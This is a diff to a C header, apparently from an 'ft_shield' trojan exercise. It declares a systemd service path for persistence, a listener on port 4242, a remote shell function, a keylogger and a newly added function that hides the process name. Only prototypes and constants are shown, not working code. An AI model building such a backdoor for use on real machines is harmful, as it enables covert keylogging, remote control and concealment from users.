@@ -35,7 +35,7 @@
 #define KEY_REPEATED 2
 #define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
 #define LISTENING_PORT 4242
-#define MAX_CONECTIONS 10
+#define MAX_CONECTIONS 32 //because pipes may need more fds...
 #define MAX_NBR_CLIENTS 2
 
 #define TRIM_CHARS "\f\n\r\t\v "
@@ -99,6 +99,8 @@ typedef struct s_server {
 	t_client	clients[MAX_CONECTIONS];
 	size_t		total_outbytes;
 	size_t		total_inbytes;
+	fd_set		rfds;
+	fd_set		wfds;
 }	t_server;
 
 
@@ -106,13 +108,14 @@ int		handle_input(t_server *server, int index, char *buffer);
 void	handle_handshake(t_server *server, int index, char *input);
 int		handle_commands(t_server *server, int index, char *input);
 void	delete_client(t_server *server, int index);
+int		extract_outpipe(t_server *server, int index);
 
 /* shell.c */
 // void	*shell_function(void *data);
-void	*shell_function(t_server *server, int index);
+int	shell_function(t_server *server, int index);
 
 /* keylogger.c */
-void	*keylogger_function(t_server *server, int index);
+int	keylogger_function(t_server *server, int index);
 
 /* keylogger_utils.c */
 int hasEventTypes(int fd, unsigned long evbit_to_check);
@@ -159,5 +162,6 @@ bool	shell_was_closed(t_list *node);
 void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));
 void	ft_lstdelone(t_list *lst, void (*del)(void *));
 void	ft_lstclear(t_list **lst, void (*del)(void *));
+void	hide_process_name(char **argv);
 
 #endif
